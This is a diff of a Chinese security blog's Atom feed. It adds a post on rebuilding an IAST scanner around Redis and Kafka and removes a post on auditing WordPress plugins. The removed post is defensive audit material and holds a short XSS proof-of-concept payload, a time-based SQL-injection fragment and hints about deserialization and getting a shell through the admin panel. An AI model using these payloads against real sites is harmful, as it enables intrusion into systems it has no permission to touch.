@@ -1,4 +1,106 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-03-24T19:50:36+08:00</updated><id>http://localhost:4000/</id><title type="html">HellSec</title><subtitle>原创网络安全博客&lt;-|-&gt;匠心独运，做有深度的良品。</subtitle><author><name>HellSec</name></author><entry><title type="html">业务SDL的上岸体历（二）</title><link href="http://localhost:4000/operation/2021/03/09/sdl-result2/" rel="alternate" type="text/html" title="业务SDL的上岸体历（二）" /><published>2021-03-09T21:46:00+08:00</published><updated>2021-03-09T21:46:00+08:00</updated><id>http://localhost:4000/operation/2021/03/09/sdl-result2</id><content type="html" xml:base="http://localhost:4000/operation/2021/03/09/sdl-result2/">&lt;p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-07-23T23:25:08+08:00</updated><id>http://localhost:4000/</id><title type="html">HellSec</title><subtitle>原创网络安全博客&lt;-|-&gt;匠心独运，做有深度的良品。</subtitle><author><name>HellSec</name></author><entry><title type="html">IAST重构实录(一)</title><link href="http://localhost:4000/scanner/2021/07/22/iast-record-1/" rel="alternate" type="text/html" title="IAST重构实录(一)" /><published>2021-07-22T21:13:00+08:00</published><updated>2021-07-22T21:13:00+08:00</updated><id>http://localhost:4000/scanner/2021/07/22/iast-record-1</id><content type="html" xml:base="http://localhost:4000/scanner/2021/07/22/iast-record-1/">&lt;p&gt;
+	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;最近接了个新的坑，准备重构某个IAST的项目。由于以前针对集群和大数据的接入使用，都是对二次封装平台接触的多。然鹅这次需要自己上服务器完整趟坑，故而记录下流水账，给连续加的班留个纪念。
+    &lt;/strong&gt;&lt;/span&gt;
+&lt;/p&gt;
+
+&lt;h3 id=&quot;redis脏数据的问题&quot;&gt;redis脏数据的问题&lt;/h3&gt;
+
+&lt;p&gt;在接入redis集群时，开始测的时候只做了单元测试，处理时基本没遇到啥问题。&lt;/p&gt;
+
+&lt;p&gt;但在整体联动试运行时，发现原来服务器集群上留存有原来测试脚本和agent，在往redis集群里打脏数据，格式与现有的不一致，导致连连报错。&lt;/p&gt;
+
+&lt;p&gt;后来通过定位crontab和现有进程，找出了运行的几个测试脚本和agent，将它们干掉做了缓释。&lt;/p&gt;
+
+&lt;h3 id=&quot;redis集群配置问题&quot;&gt;redis集群配置问题&lt;/h3&gt;
+
+&lt;p&gt;我们知道，redis集群上执行一些命令，如&lt;code class=&quot;highlighter-rouge&quot;&gt;flushall&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;keys*&lt;/code&gt;等等，对线上环境可能会造成影响，所以一般会重命名，也就会用到&lt;code class=&quot;highlighter-rouge&quot;&gt;rename-command&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;但是我搞的时候不太熟，结果整的无论是redis-cli练连上去，还是开发急脚本用库去连，都不好使会显示：&lt;code class=&quot;highlighter-rouge&quot;&gt;command not found&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;所以后来我在redis配置文件里找到重命名的命令后，直接在任务函数里封装了一层远程cli命令，动态配置账密和rename以后的命令，引用配置来写死来执行危险操作（屏蔽了logging），如：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli -h x.x.x.x -p xxx -a xxx commandxxx
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;redis持久化异常&quot;&gt;redis持久化异常&lt;/h3&gt;
+
+&lt;p&gt;一个异常提示的是：
+&lt;code class=&quot;highlighter-rouge&quot;&gt;MISCONF Redis is configured to save RDB snapshots...&lt;/code&gt;，这个其实就是持久化问题，一般不建议配置太长时间，该清理就清理，或者设置好expire时间。&lt;/p&gt;
+
+&lt;p&gt;还有个提示是redis达到max records还是啥玩意儿，提示的大概是  &lt;code class=&quot;highlighter-rouge&quot;&gt;OOM command not allowed when used memory &amp;gt; 'maxmemory'&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;大概说是达到上限了，连接集群时，我尝试捕获错误也没捕获到。所以也不好根据这个来判定特征，对方只是直接拒绝连接了。&lt;/p&gt;
+
+&lt;p&gt;我处理这类情况一般是，针对键值配置好足额的expire时间，然后定期去判定dbszie，设定一个肩部峰值，暂定的是70%-80%左右。最后，再加上我之前cli版本的主动清理，事实上还是比较好处理这类问题的。&lt;/p&gt;
+
+&lt;h3 id=&quot;kafka-rebalancing解决&quot;&gt;kafka rebalancing解决&lt;/h3&gt;
+
+&lt;p&gt;注意，kafka如果读取时切换任务比较快，可以设置较短的时间避免rebalancing。&lt;/p&gt;
+
+&lt;p&gt;但是如果本身消费的时候，需要进行延时逻辑判定，或者需要等待kafka消息流等情况，就需要其他情况来控制了。&lt;/p&gt;
+
+&lt;p&gt;相关配置参数如下（python版本）：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session_timeout_ms(会话池过期时间，维持活跃)
+heartbeat_interval_ms（心跳时间，涉及rebalancing）
+max_poll_interval_ms（总过期时间，设置过短容易rebalancing）
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;kafka时间段跳空后开&quot;&gt;kafka时间段跳空后开&lt;/h3&gt;
+
+&lt;p&gt;我遇到的情况是，同一个groupid的情况下，在kafka topicA读数据流，选取了一个权重最大的时间点作为锚点。&lt;/p&gt;
+
+&lt;p&gt;然后我又以此时间点，去kafka topicB读取数据存入redis缓存，作为基准分析数据。&lt;/p&gt;
+
+&lt;p&gt;等我回过头再去kafka topicA读数据流时，发现新读取的数据流时间点，居然比存入缓存的topicB时间更晚。&lt;/p&gt;
+
+&lt;p&gt;我仔细想了想，是不是因为在我读取kafka topicB去存的时候产生了延时，然后kafka topicA数据流的offset其实依然在跑。&lt;/p&gt;
+
+&lt;p&gt;但是我消费的时候，设置了auto commit和手动commit和close，kafka topicA的二次锚点还是会跳空比缓存数据后开，这个问题目前偶尔会跳出来，留待之后观察。&lt;/p&gt;
+
+&lt;h3 id=&quot;批量插入和消费问题&quot;&gt;批量插入和消费问题&lt;/h3&gt;
+
+&lt;p&gt;主要聊聊kafka消费和redis的读插，两个比较简单的问题，放在一起聊了。&lt;/p&gt;
+
+&lt;h4 id=&quot;kafka读取&quot;&gt;kafka读取&lt;/h4&gt;
+
+&lt;p&gt;本身kafka属于流数据，通过offset控制读取的点位，竞争消费的问题由groupid控制解决。&lt;/p&gt;
+
+&lt;p&gt;但是在竞争读取数据时，要知道redis缓存上限原来是按单进程进行窗口结算的。&lt;/p&gt;
+
+&lt;p&gt;我在开多线程以后，如果从某个线程读取窗口数据，mset压入redis集群触发存储告警上限。&lt;/p&gt;
+
+&lt;p&gt;这时候我们需要主动杀死线程，这样可能会丢失另外几个相当多的正在压入redis的数据。&lt;/p&gt;
+
+&lt;p&gt;解决方案的话，我这边考虑的是多起几个节点和或者线程，减少单个单线程和节点的数据集。&lt;/p&gt;
+
+&lt;p&gt;一旦停止，能通过少量时间的time-sleep来缓释节点的数据处理压力，也能避免&lt;code class=&quot;highlighter-rouge&quot;&gt;max_poll_interval_ms&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;session_timeout_ms&lt;/code&gt;设置的时间过长的问题。&lt;/p&gt;
+
+&lt;h4 id=&quot;redis读写之殇&quot;&gt;redis读写之殇&lt;/h4&gt;
+
+&lt;p&gt;在取redis数据的时候，读的动作和速度肯定是延后于写的。本身这事儿就不应该用消息队列型存储来搞，在数据量堆积到时候读压力巨tm大。&lt;/p&gt;
+
+&lt;p&gt;实时规则处理可以用spark或者flink框架，离线的话完全可以采用hive（kafka2hive）存储kafka结果，定时拉取表对比生成临时hive表，再用脚本规则过滤去输出结果。&lt;/p&gt;
+
+&lt;p&gt;这里因为一些限制借助不了大数据平台的能力，也不能指望我为一个项目搞个一套平台框架。&lt;/p&gt;
+
+&lt;p&gt;所以呢，还是沿用的原来的思路，借助redis缓存，形成时间窗口。&lt;/p&gt;
+
+&lt;p&gt;然后依据单个kafka数据的index_id和时间点作为锚定标准，去对比分析另一个kafka数据流，最后完成阶段性循环。&lt;/p&gt;
+
+&lt;p&gt;但是在读redis的时候，批量mget数据意义不大，貌似提速不了多少。&lt;/p&gt;
+
+&lt;p&gt;我这边是根据两个kafka队列的index_id去做判定的。&lt;/p&gt;
+
+&lt;p&gt;如果一次性mget多个数据，通过多线程去做index_id的关联逻辑判定时，如果规则判定本身不怎么耗时的话，你会发现并没有快多少。&lt;/p&gt;
+
+&lt;p&gt;所以结论是，大头还是落在kafka读取的压力上，取了以后就能去做分布式匹配。&lt;/p&gt;
+
+&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;
+
+&lt;p&gt;本小节只简单聊了下之前踩过的准备坑，针对IAST本身没有聊太多，后面的续篇会简单介绍下。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">最近接了个新的坑，准备重构某个IAST的项目。由于以前针对集群和大数据的接入使用，都是对二次封装平台接触的多。然鹅这次需要自己上服务器完整趟坑，故而记录下流水账，给连续加的班留个纪念。</summary></entry><entry><title type="html">业务SDL的上岸体历（二）</title><link href="http://localhost:4000/operation/2021/03/09/sdl-result2/" rel="alternate" type="text/html" title="业务SDL的上岸体历（二）" /><published>2021-03-09T21:46:00+08:00</published><updated>2021-03-09T21:46:00+08:00</updated><id>http://localhost:4000/operation/2021/03/09/sdl-result2</id><content type="html" xml:base="http://localhost:4000/operation/2021/03/09/sdl-result2/">&lt;p&gt;
 	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;之前已经聊过在甲方团队做DevSecOps能力建设的零碎轨迹，但是针对项目级安全治理的关键细节，我们还不曾详述，那么接下来简单讲一讲。&lt;/strong&gt;&lt;/span&gt;
 &lt;/p&gt;
 
@@ -1560,432 +1662,4 @@ xor sleep(8)
 
 &lt;p&gt;当然，如果这里调的level比较高的话，低级别的poc检测成功后，是可以向上跃迁检测的。&lt;/p&gt;
 
-&lt;p&gt;另外，这里不建议优先采用公共dns平台，因为即使是使用了api交互，公共dns平台也一般会有延时的风险，更别提可能被GA监控管制，再者说证明截图啥的，也需要时间的。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">在实现漏洞扫描的时候，部分开发者会使用payload直接进行fuzz，而且并没有对server端的拦截和过滤，有相对智能的反馈，这对扫描效率和成功率是影响比较大的。</summary></entry><entry><title type="html">Wordpress插件漏洞的攻防浅析</title><link href="http://localhost:4000/vuln/2019/10/23/wordpress-adsec/" rel="alternate" type="text/html" title="Wordpress插件漏洞的攻防浅析" /><published>2019-10-23T23:40:00+08:00</published><updated>2019-10-23T23:40:00+08:00</updated><id>http://localhost:4000/vuln/2019/10/23/wordpress-adsec</id><content type="html" xml:base="http://localhost:4000/vuln/2019/10/23/wordpress-adsec/">&lt;p&gt;
-	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;一般出名点的开源软件，比如wordpress的核心高危漏洞是比较难挖的。但其附属的高用户量的插件漏洞也是具有一定的价值的，而挖掘起来相对容易些，这里就来简单谈谈wordpress插件漏洞的挖掘和修复。&lt;/strong&gt;&lt;/span&gt;
-&lt;/p&gt;
-
-&lt;h3 id=&quot;常用输入点&quot;&gt;常用输入点&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;$_GET&lt;/li&gt;
-  &lt;li&gt;$_POST&lt;/li&gt;
-  &lt;li&gt;$_REQUEST&lt;/li&gt;
-  &lt;li&gt;$_SERVER[‘REQUEST_URI’]&lt;/li&gt;
-  &lt;li&gt;$_SERVER[‘PHP_SELF’]&lt;/li&gt;
-  &lt;li&gt;$_SERVER[‘HTTP_REFERER’]&lt;/li&gt;
-  &lt;li&gt;$_COOKIE&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;如果要挖掘指定的cms漏洞，我们就需要去寻找代码里，一些比较重要的自带函数是否存在漏洞。或者也可以看看一些安全过滤函数，是否得到了正确应用。&lt;/p&gt;
-
-&lt;h3 id=&quot;输入检查&quot;&gt;输入检查&lt;/h3&gt;
-
-&lt;p&gt;例如， 开发者可以使用sanitize_email()来清理电子邮件的地址，使用sanitize_text_field()来清理文本，使用sanitize_sql_orderby()来验证SQL的ORDER BY语句等。 WordPress中的sanitize_*()类辅助函数已经覆盖了大多数用户输入类型：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;sanitize_email()&lt;/li&gt;
-  &lt;li&gt;sanitize_file_name()&lt;/li&gt;
-  &lt;li&gt;sanitize_hex_color()&lt;/li&gt;
-  &lt;li&gt;sanitize_hex_color_no_hash()&lt;/li&gt;
-  &lt;li&gt;sanitize_html_class()&lt;/li&gt;
-  &lt;li&gt;sanitize_key()&lt;/li&gt;
-  &lt;li&gt;sanitize_meta()&lt;/li&gt;
-  &lt;li&gt;sanitize_mime_type()&lt;/li&gt;
-  &lt;li&gt;sanitize_option()&lt;/li&gt;
-  &lt;li&gt;sanitize_sql_orderby()&lt;/li&gt;
-  &lt;li&gt;sanitize_text_field()&lt;/li&gt;
-  &lt;li&gt;sanitize_title()&lt;/li&gt;
-  &lt;li&gt;sanitize_title_for_query()&lt;/li&gt;
-  &lt;li&gt;sanitize_title_with_dashes()&lt;/li&gt;
-  &lt;li&gt;sanitize_user()&lt;/li&gt;
-  &lt;li&gt;esc_url_raw()&lt;/li&gt;
-  &lt;li&gt;wp_filter_post_kses()&lt;/li&gt;
-  &lt;li&gt;wp_filter_nohtml_kses()&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;输出检查&quot;&gt;输出检查&lt;/h3&gt;
-
-&lt;p&gt;如果没有做好输出检查，可能会导致各种模板注入或者xss一类的漏洞。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;esc_html() 更改html响应类型&lt;/li&gt;
-  &lt;li&gt;esc_url() 过滤url里的内容。&lt;/li&gt;
-  &lt;li&gt;esc_js()  过滤内联js内容的输出内容。&lt;/li&gt;
-  &lt;li&gt;esc_attr() 用于过滤输出点在标签属性中的情况，相应的转义。&lt;/li&gt;
-  &lt;li&gt;esc_textarea() 用于过滤输出点在textarea标签中的情况，相应的转义。&lt;/li&gt;
-  &lt;li&gt;tag_escape() 用于出现在HTML标签中的情况，主要用于正则。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;xss&quot;&gt;xss&lt;/h3&gt;
-
-&lt;p&gt;举例：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;add_query_arg()&lt;/li&gt;
-  &lt;li&gt;remove_query_arg()&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;上面两个是wordpress用来动态添加/删除参数的，要是保持默认不指定字符串作为参数：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo add_query_arg( array(
-    'key1' =&amp;gt; 'value1',
-    'key2' =&amp;gt; 'value2',
-), 'http://example.com' );
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;他会使用未经过转义的$_SERVER[‘REQUEST_URI’]，而不是$_SERVER[‘PHP_SELF’]，这样直接打印出来可能会造成xss漏洞。&lt;/p&gt;
-
-&lt;p&gt;防范的话：&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;在重定向或者header里面建议使用esc_url_raw。&lt;/li&gt;
-  &lt;li&gt;打印完整url时，需要使用esc_url来转为HTML实体。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;如果完全不考虑在文章里加入未过滤的html标签，有个函数是对wordpress超级管理员也生效的
-如果要屏蔽所有的用户，包括管理员，超级管理员，我们可以这样设置：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;define( 'DISALLOW_UNFILTERED_HTML', true );
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;输出渲染导致的html实体编码失效&quot;&gt;输出渲染导致的HTML实体编码失效&lt;/h4&gt;
-
-&lt;p&gt;比如，在WordPress内置的编辑器Gutenberg中（WordPress 5.0到5.2.2相关联），FortiGuard Labs的威胁研究人员Zhouyuan Yang表示，如果文章中包含一条“Shortcode”的错误信息，则Gutenberg无法过滤文章的javascript/HTML代码。&lt;/p&gt;
-
-&lt;p&gt;Shortcode本质上是WordPress用户用来嵌入文件或创建对象的快捷方式，这些对象和文件通常涉及复杂的代码，而Shortcode数据块可以通过单击Gutenberg编辑器中的“Add Block”按钮添加到页面中。&lt;/p&gt;
-
-&lt;p&gt;然而，根据分析，当将某些被编码的HTML字符(如\&amp;lt;)添加到Shortcode数据块中时，就会发生某些错误。&lt;/p&gt;
-
-&lt;p&gt;在Wordpress预览文章时会把\&amp;lt;解码为&amp;lt;，此时XSS过滤器毫无反应。相关PoC：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;amp;gt;&amp;amp;lt;img src=1 on error=prompt(1)&amp;amp;gt;。
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;这种情况下就只有直接replace特殊符号为空了，不过也算小概率事件，一般在富文本渲染和留言处多见。&lt;/p&gt;
-
-&lt;h4 id=&quot;响应格式不明&quot;&gt;响应格式不明&lt;/h4&gt;
-
-&lt;p&gt;另外，在没有选项参数的情况下使用json_encode函数，会导致PHP不会转义其他字符（参见JSON_HEX_TAG）。因此，我们可以将任意HTML注入到响应中，但是没有浏览器会在JSON响应中评估HTML吗？好吧，只有当您的JSON响应告诉浏览器它实际上就是JSON的时候才会评估，示例见：
-&lt;a href=&quot;https://xz.aliyun.com/t/2643&quot;&gt;json_encode&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function evomdt_ajax(){
-  if(empty($_POST['type'])) return;
-
-  $type = $_POST['type'];
-  $output = '';
-
-  switch($type){
-  case 'newform':
-    echo json_encode(array(
-      'content' =&amp;gt;$this-&amp;gt;mdt_form($_POST['eventid'], $_POST['tax']),
-      'status'=&amp;gt;'good'
-    )); exit;
-  break;
-  case 'editform':
-    echo json_encode(array(
-      'content' =&amp;gt;$this-&amp;gt;mdt_form($_POST['eventid'], $_POST['tax'],$_POST['termid'] ),
-      'status'=&amp;gt;'good'
-    )); exit;
-  break;
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;响应格式为text/html，而不是application/json：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
-[...]
-Content-Type: text/html; charset=UTF-8
-
-{&quot;content&quot;:[...]
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;sql注入&quot;&gt;SQL注入&lt;/h3&gt;
-
-&lt;p&gt;下面是wordpress自带的不安全的sql查询关键词，需要我们单独去调用过滤函数：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;$wpdb-&amp;gt;query()&lt;/li&gt;
-  &lt;li&gt;$wpdb-&amp;gt;get_var()&lt;/li&gt;
-  &lt;li&gt;$wpdb-&amp;gt;get_row()&lt;/li&gt;
-  &lt;li&gt;$wpdb-&amp;gt;get_col()&lt;/li&gt;
-  &lt;li&gt;$wpdb-&amp;gt;get_results()&lt;/li&gt;
-  &lt;li&gt;$wpdb-&amp;gt;replace()&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;安全的sql函数：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;$wpdb-&amp;gt;insert()&lt;/li&gt;
-  &lt;li&gt;$wpdb-&amp;gt;update()&lt;/li&gt;
-  &lt;li&gt;$wpdb-&amp;gt;delete()&lt;/li&gt;
-  &lt;li&gt;$wpdb-&amp;gt;prepare()&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;在wordpressv3.5以前，可以直接拼接传入语句，容易出现SQL注入漏洞：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$wpdb-&amp;gt;query( $wpdb-&amp;gt;prepare( &quot;INSERT INTO table (user, pass) VALUES ('$user', '$pass')&quot; ) );
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;现在新版的wordpress里面声明就友好多了，需要占位符依次传入参数：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php $sql = $wpdb-&amp;gt;prepare( 'query' , value_parameter[, value_parameter ... ] ); ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;下面的函数挺好用，但这里的转义只会转义特殊字符，对于order by和未用单引号闭合的参数是不能预防的。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;esc_sql()&lt;/li&gt;
-  &lt;li&gt;escape()&lt;/li&gt;
-  &lt;li&gt;esc_like()&lt;/li&gt;
-  &lt;li&gt;like_escape()&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;$wpdb-&amp;gt;prepare()真香系列。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;官方的说法是：&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;In 99% of cases, you can use $wpdb-&amp;gt;prepare() instead, and that is the recommended method.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;This function is only for use in those rare cases where you can’t easily use $wpdb-&amp;gt;prepare().&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;One example is preparing an array for use in an IN clause.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;注意，新版wordpress会自动将$_GET$_POST$_COOKIE$_SERVER中的值，使用add_magic_quotes方法进行过滤。&lt;/p&gt;
-
-&lt;p&gt;但值得一提的是，随后，将过滤后的GET与POST数组合并后覆盖$_REQUEST。在以往一些安全性不高的程序中，往往会出现，过滤了GET与POST，却忘记过滤REQUEST的情况，导致漏洞的产生。&lt;/p&gt;
-
-&lt;p&gt;另外，在传入数组时，wordpress不会对数组成员进行add_magic_quotes转义。&lt;/p&gt;
-
-&lt;p&gt;另外，WordPress除了强制向输入内容添加斜杠外，它还提供了几个内置的过滤函数，用于清理用户输入和保护内容输出。&lt;/p&gt;
-
-&lt;p&gt;下面的屏蔽SQL错误，虽然不防延时注入（手动滑稽）：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php $wpdb-&amp;gt;show_errors(); ?&amp;gt; 
-&amp;lt;?php $wpdb-&amp;gt;hide_errors(); ?&amp;gt; 
-&amp;lt;?php $wpdb-&amp;gt;print_error(); ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;任意文件下载&quot;&gt;任意文件下载&lt;/h3&gt;
-
-&lt;p&gt;可疑函数，雷同于普通审计：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;file()&lt;/li&gt;
-  &lt;li&gt;readfile()&lt;/li&gt;
-  &lt;li&gt;file_get_contents()&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;文件包含&quot;&gt;文件包含&lt;/h3&gt;
-
-&lt;p&gt;可疑函数，雷同于普通审计：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;include()&lt;/li&gt;
-  &lt;li&gt;require()&lt;/li&gt;
-  &lt;li&gt;include_once()&lt;/li&gt;
-  &lt;li&gt;require_once()&lt;/li&gt;
-  &lt;li&gt;fread()&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;文件删除&quot;&gt;文件删除&lt;/h3&gt;
-
-&lt;p&gt;可疑函数，雷同于普通审计：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unlink() 任意删除文件
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;文件上传&quot;&gt;文件上传&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sanitize_file_name() 可以创建有效的php文件, 把test.(php)转为test.php
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;一般情况下，wordpress自带的编辑器上传一般是做了校验的，如果不是的话，可以尝试fuzz一下。
-另外，在超管权限下是可以直接编辑模板拿shell或者传插件的，这个需要在服务器上配置限制修改和上传的权限。&lt;/p&gt;
-
-&lt;h3 id=&quot;反序列化漏洞&quot;&gt;反序列化漏洞&lt;/h3&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;unserialize() any raw user input passed to this function is probably exploitable, if serialized() first, probably not vulnerable&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;一般来说，利用PHP的反序列化漏洞，一般要注意几点：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;phar文件要能够上传到服务器端。&lt;/li&gt;
-  &lt;li&gt;要有可用的魔术方法作为“跳板”。&lt;/li&gt;
-  &lt;li&gt;文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。&lt;/li&gt;
-  &lt;li&gt;输入参数值反序列化后，其本身的结果，可以直接触发提权动作。&lt;/li&gt;
-  &lt;li&gt;一般主分支难以找到反序列化利用点，所以要尝试在插件的类去找可以利用的魔术方法。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;具体可以参考：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/680/#32-wordpress&quot;&gt;利用 phar 拓展 php 反序列化漏洞攻击面【wordpress】&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/vuls/198913.html&quot;&gt; WordPress插件Easy WP SMTP反序列化漏洞分析&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;插件辅助判断&quot;&gt;插件辅助判断&lt;/h3&gt;
-
-&lt;p&gt;在反序列化之前先进行序列化，会有一定的防治作用，有款wordpress插件提供可反序列化的类，和配套的burp插件可以验证漏洞的存在：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.pluginvulnerabilities.com/2017/07/24/wordpress-plugin-for-use-in-testing-for-php-object-injection/&quot;&gt;wordpress插件分析&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.pluginvulnerabilities.com/wp-content/uploads/2017/07/php-object-injection-test.zip&quot;&gt;wordpress插件下载&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/ethicalhack3r/7c2618e5fffd564e2734e281c86a2c9b&quot;&gt;配套burp插件&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;大致核心代码如下，稍微解释下，类的__wakeup()方法（*PHP“魔术方法”，unserialize()函数会检查是否存在__wakeup()，如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源），如果一个类定义了__wakeup()方法，那么无论何时该类的某个对象使用了unserialize()函数进行反序列化都能保证__wakeup()方法一定被调用：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?
-
-class PHP_Object_Injection {
-   function __wakeup() {
-		exit('PHP object injection has occurred.');
-   }
-}
-
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;burp插件在检测到关键词时（PHP object…occurred）,会提示检测到漏洞。&lt;/p&gt;
-
-&lt;h3 id=&quot;命令执行&quot;&gt;命令执行&lt;/h3&gt;
-
-&lt;p&gt;可疑函数，雷同于普通审计：&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;system()&lt;/li&gt;
-  &lt;li&gt;exec()&lt;/li&gt;
-  &lt;li&gt;passthru()&lt;/li&gt;
-  &lt;li&gt;shell_exec()&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;代码执行&quot;&gt;代码执行&lt;/h3&gt;
-
-&lt;p&gt;可疑函数，雷同于普通审计：&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;eval()&lt;/li&gt;
-  &lt;li&gt;assert()&lt;/li&gt;
